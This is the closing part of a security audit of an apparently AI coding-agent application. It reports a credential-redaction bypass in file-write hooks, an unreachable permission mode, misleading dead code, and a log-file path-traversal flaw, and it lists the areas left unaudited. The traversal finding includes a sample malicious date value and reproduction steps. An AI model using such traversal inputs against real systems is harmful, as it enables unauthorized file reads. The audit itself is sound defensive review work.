**Why it matters:** `P3-65`'s stated defect was *"four recipes could ask for
`Supervised` and get none of it"*. The wiring landed, but no reachable declaration
exercises it, so the fix is inert in the shipped configuration and no test or run can
distinguish it from the old hardcode. `TG-P3-65` (`ci_gate.rs:2064`) asserts only that
the **string** `PermissionMode::from(&recipe.permission_mode)` appears in
`runner.rs` — a substring check that passes regardless of reachability.
**Reproduction:** Trigger `fleet-smoke` with the orchestrator down → early return at
`runner.rs:741` (`fallback_idle`), engine never built. With the orchestrator up → Mode
2 path, which has no `permission_mode` reader. Set a breakpoint on `:825` and run every
shipped recipe: it is only ever reached with `Autonomous`.
**Confidence:** certain for the reachability analysis (single reader, single early
return, declarations read directly). I did not check whether a *user-authored* recipe
could reach it — one declaring `Supervised` + `Mode1Capable` + no schedule would, so
the wiring is not dead for user recipes, only for every shipped one.

---

## G-18 · `write_file` and `edit_file` hand RAW, unredacted tool input to `PostFileWrite` hooks, bypassing the executor's redaction boundary · high
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\write_file.rs:139-160` (`input: input.clone()`), `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\edit_file.rs:73` + `:199` (`input: input_for_hook`)
**Defect:** `ToolExecutor` establishes the redaction boundary deliberately and says why:
> *"The tool itself is given the raw input — it needs the real value to do its work.
> This is the copy that goes to the UI event, the hook context and the `messages`
> table. `G4:486` recorded unredacted tool arguments reaching procedural memory
> verbatim, and memory is permanent."* (`tool_executor.rs:137-145`)

and it passes `reported.clone() // A-08` into both the `PreToolUse` and `PostToolUse`
hook contexts. But `write_file` and `edit_file` build **their own** `HookContext` for
`HookType::PostFileWrite` and put the raw `serde_json::Value` in it. Neither calls
`redaction::redact_args`.

That matters because `redact_json` scrubs at two levels: sensitive **key names**, and
— via `redact_value_text` on every string — credential-shaped **values**
(`redaction.rs:333-354`). The bypassed content is `write_file`'s `content` field and
`edit_file`'s `new_string`: the literal bytes being written to disk. Writing a `.env`,
a config with an inline token, or a test fixture containing a key puts that key,
verbatim, into the hook payload.
**Why it matters:** `HookExecutor` interpolates the context into shell commands and
HTTP URLs (G-16) and persists stdout/stderr into `HookExecutionLog`. So a
`PostFileWrite` hook — the natural place a user puts an audit or notification hook —
receives credentials the rest of the system is careful to strip. The `PostFileWrite`
hook is also the one hook type the executor's boundary cannot cover, because the tools
fire it themselves.

Related: `append_file` and `write_interface_spec` write files and do not appear to fire
`PostFileWrite` at all, so hooks see an incomplete picture of writes — the inverse
inconsistency.
**Reproduction:** Register any `PostFileWrite` shell hook using `{{tool_call}}`. Have
the agent `write_file` a file whose content contains an API key. The key appears in the
hook's command line and in the persisted execution log.
**Confidence:** certain for the bypass (`redact_args` is not called on either path).
Whether `append_file` genuinely omits the hook I verified only by grep for
`HookContext` in that file — it has no match.

---

## G-19 · Five unreferenced second paths survive, including one whose docstring claims it prevents drift · medium
**Where:** listed per item below. All verified with workspace-wide grep excluding `target/`.
**Defect:** `TG3-07` is stated in this codebase as *"an unreferenced second path is a
defect waiting for a caller"*, and `execute()` / `build_system_prompt` were deleted
under it. Five remain:

1. **`Tool::is_read_only()` — zero call sites.**
   `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\tool_trait.rs:141`.
   `grep -rn "\.is_read_only()"` matches only a *comment* in `ci_gate.rs:1409`.
   `execute_batch` partitions on `tool.effect().is_concurrency_safe()` (`tool_executor.rs:257`),
   not on this method. Its own doc says *"A tool may still override where it knows
   better about its own contention"* — **an override cannot take effect**, because
   nothing reads it. `list_worker_messages.rs:54` writes such an override (returning
   `false` with a paragraph of reasoning); it is inert. It happens to agree with what
   `ToolEffect::Board` produces, so nothing is currently mis-partitioned — but the next
   tool that overrides it will be.
2. **`ContextBuilder::build_system_prompt_with_mode` — zero callers.**
   `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\context.rs:54`. Its docstring
   says it exists *"so the joined form and the split form cannot drift apart"* and cites
   the deletion of `build_system_prompt` for exactly this. It is itself now the second
   path: `engine.rs:207` calls `build_system_prompt_parts` and joins the halves inline
   with its own format string (`"{stable}\n\n---\n\n{volatile}"`). Two copies of the
   join separator, one unreferenced — which is precisely the drift the docstring
   claims to prevent.
3. **`SubagentPool::qc_available` — zero callers**, `C:\AIRS Foundry\autodev\autodev\autodev-core\src\subagent\pool.rs:172`.
   Its docstring says *"Used by the Subagent Monitor UI to render 'QC: 3/6 in flight'
   without re-walking the registry."* The command that renders that
   (`subagent_commands.rs:135-150`, `get_qc_reviewer_stats`) does the opposite: it
   re-walks `manager.list(None)` and reads the `MAX_CONCURRENT_QC` **constant**. So the
   UI figure comes from the registry, not the semaphore, and the two can disagree
   whenever a permit is held by a spawn that has not yet been inserted into the registry.
4. **`SubagentPool::global_available` — zero callers**, `pool.rs:181`.
5. **`PermissionRequest` — never constructed**, `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\permission.rs:27`, and re-exported from `agent/mod.rs:19`.
   The live prompt payload is `events::PermissionPayload`. Two structurally identical
   types describing the same message, one of them public API.
**Why it matters:** Items 1 and 3 are not merely dead — each carries a docstring
asserting a behaviour the code does not have, so a reader inherits a false model of the
system. Item 1 is the same shape as the `is_read_only`-as-security-control defect
`P3-11` fixed: a method whose declared purpose no longer matches any reader.
**Reproduction:** `grep -rn "\.is_read_only()\|build_system_prompt_with_mode\|qc_available\|global_available\|PermissionRequest {" --include=*.rs . | grep -v target`
**Confidence:** certain.

---

## G-20 · `read_log_file` / `read_log_file_full` interpolate an unvalidated `date` into a filesystem path · low
**Where:** `C:\AIRS Foundry\autodev\autodev\src-tauri\src\commands\log_commands.rs:95`, `:152`
**Defect:** `let path = dir.join(format!("autodev-{date_str}.log"));` where `date_str`
is the caller's `date: String` with no validation — not a date-format check, not a
component check, not a canonicalise-and-verify-under-`dir` check. A value containing
`/` or `\` introduces extra path components, and `..` components let the resolved path
leave `~/.autodev/logs`. The suffix constrains the target to files ending in `.log`;
the `autodev-` prefix is defeated by starting the value with a separator
(`"/../../x"` → `logs/autodev-/../../x.log`).
**Why it matters:** These are Tauri commands, so the caller is the bundled frontend
rather than the model — this is not directly agent-reachable, which is why it is
ranked low. It is still an unvalidated path parameter in a file whose siblings
(`clear_log_files`, `export_log_file`) touch the filesystem, and the workspace has a
`validate_workspace_path` helper for exactly this shape that is not used here.
**Reproduction:** Invoke `read_log_file` with `date = "/../../../secret"`.
**Confidence:** probable. The lack of validation is certain; whether the traversal
actually resolves depends on OS path normalisation (Win32 normalises `..` lexically
and would; POSIX requires each intermediate directory to exist and may not). I did not
execute it.

---

## Summary

### Areas swept
- `autodev-core/src/agent/` — `tool_executor.rs`, `engine.rs`, `permission.rs`,
  `tool_effect.rs`, `tool_trait.rs`, `tool_registry.rs`, `context.rs`, `compaction.rs`
  (all read in full).
- `autodev-core/src/agent/builtin_tools/` — `path_jail.rs`, `path_lock.rs`, `bash.rs`,
  `e2e_probe.rs`, `check_file.rs`, `validate.rs` (spawn sites + resolution),
  `read_file.rs`, `grep.rs`, `glob.rs`, `list_directory.rs`, `write_file.rs`,
  `edit_file.rs`, `append_file.rs`, `analyze_diff_tool.rs`, `spawn_subagent.rs`,
  `spawn_parallel_subagents.rs`, `spawn_qc_review.rs` (incl. `qc_cost_guard`),
  `update_task_status_tool.rs`, `build_evidence.rs`, `mod.rs` (registration),
  `list_worker_messages.rs`. Effect + jail coverage checked across **all** tools by grep.
- `autodev-core/src/subagent/` — `manager.rs`, `pool.rs`, `native_runner.rs` (all in full).
- `autodev-core/src/provider/` — `capped.rs`, `retry.rs`, `factory.rs`, `streaming.rs`,
  `anthropic.rs` (request assembly), plus a workspace-wide check that every provider
  construction site is wrapped by `CappedProvider`.
- `src-tauri/src/commands/` — `agent_commands.rs`, `subagent_commands.rs` (in full);
  `settings_commands.rs`, `vault_commands.rs`, `log_commands.rs`, `file_commands.rs`
  (scanned); `recipe_commands.rs`, `diff_commands.rs` (provider wrapping only).
- Adjacent, because the target areas call into them: `hooks/executor.rs`,
  `recipes/runner.rs` + `recipes/defaults.rs` (permission mode / fallback policy),
  `budget/mod.rs`, `security/env_scrub.rs`, `security/redaction.rs`,
  `state/app_state.rs`, `git/diff.rs`.

### Findings by severity
| Severity | Count | IDs |
| --- | --- | --- |
| critical | 2 | G-4, G-5 |
| high | 8 | G-1, G-3, G-7, G-9, G-13, G-16, G-17, G-18 |
| medium | 8 | G-2, G-6, G-8, G-10, G-11, G-14, G-15, G-19 |
| low | 2 | G-12, G-20 |

**Read in severity order:** G-4, G-5 · G-1, G-3, G-7, G-9, G-13, G-16, G-17, G-18 ·
G-2, G-6, G-8, G-10, G-11, G-14, G-15, G-19 · G-12, G-20.

### Recurring shapes
Three of this phase's own named defect classes recur in code the phase did not touch:
- **A guard that cannot fire** — G-3 (unwired builder), G-4 (tautological comparison),
  G-11 (boundary re-pointed at two of three call sites), G-17 (the one declaration that
  would exercise a control is unreachable), G-19.1 (`is_read_only` overridable in name only).
- **A docstring promising what the code does not do** — G-3, G-4, G-12, G-15, G-19.1,
  G-19.3, and the `native_runner` justification inside G-5.
- **The redaction/consent boundary applied at some call sites and not others** —
  G-2 (hooks on one partition), G-8 (env scrub in one tool), G-18 (raw input in
  tool-authored hook contexts).

### NOT reached — gaps in this audit
Stated so the hole is visible rather than assumed covered:
- **`autodev-core/src/agent/builtin_tools/graph_tools.rs` (899 lines)** — only spot-checked.
  One observation not developed into a finding: `GetGraphReportTool::execute`
  (`:186-190`) reads the **process-relative** path `.autodev/GRAPH_REPORT.md` rather
  than a `working_dir`-relative one, which is the exact failure `path_jail.rs`'s header
  documents. It has **zero callers**, so it is currently inert.
- **`src-tauri/src/commands/graph_commands.rs` (1116 lines)** — not read.
- `worker_commands.rs`, `task_commands.rs`, `sidecar_commands.rs`, `git_commands.rs`,
  `ide_commands.rs`, `updater_commands.rs`, `browser_commands.rs`, `plugin_commands.rs`,
  `skill_commands.rs`, `memory_commands.rs`, `analytics_commands.rs`,
  `plan_commands.rs`, `budget_commands.rs`, `session_commands.rs` — not read.
  `browser_commands.rs` and `plugin/runner.rs` both spawn subprocesses and were not audited.
- **`provider/openai.rs` and `provider/google.rs` request/stream assembly** — not read
  (only `anthropic.rs` was). Provider-specific usage accounting and stop-reason mapping
  in `provider/usage.rs` were not verified.
- **`validate.rs` beyond the spawn sites** — the ~1,700-line tier2/tier2.5/tier2.6
  analysis logic was not reviewed. One unresolved question: `run_checker_subprocess`
  spawns `tsc`/`eslint`/`mypy`/`pyright` by **bare name with `.current_dir(working_dir)`
  set**, while the `P3-19` reasoning ("verified by execution on this platform") is
  written only on `resolve_python`. Whether Rust's Windows `Command` search order
  excludes the child's `current_dir` for those five names is a claim I could not verify
  without executing, and it is the difference between safe and a workspace-planted
  binary running.
- **Memory subsystem** (`memory/`), **vault backend** (`vault/keychain.rs`),
  **session manager**, **analytics**, **db layer** — out of the stated scope; not read.
- **Nothing was executed.** No build, no test, no benchmark. Every "Confidence: certain"
  is certain *about the source*; behavioural consequences marked `probable` were not
  observed.
